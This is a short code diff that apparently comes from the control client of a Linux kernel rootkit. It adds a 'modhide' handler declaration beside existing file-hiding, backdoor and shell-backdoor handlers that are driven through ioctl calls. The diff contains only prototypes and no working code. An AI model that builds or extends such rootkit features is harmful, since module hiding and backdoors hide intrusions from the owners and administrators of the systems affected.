@@ -21,6 +21,7 @@ int issue_ioctl(unsigned long, const char *);
 void help();
 
 int handle_ping(void *);
+int handle_modhide(void *);
 int handle_filehide(void *);
 int handle_backdoor(void *);
 int handle_shellbd(void *);
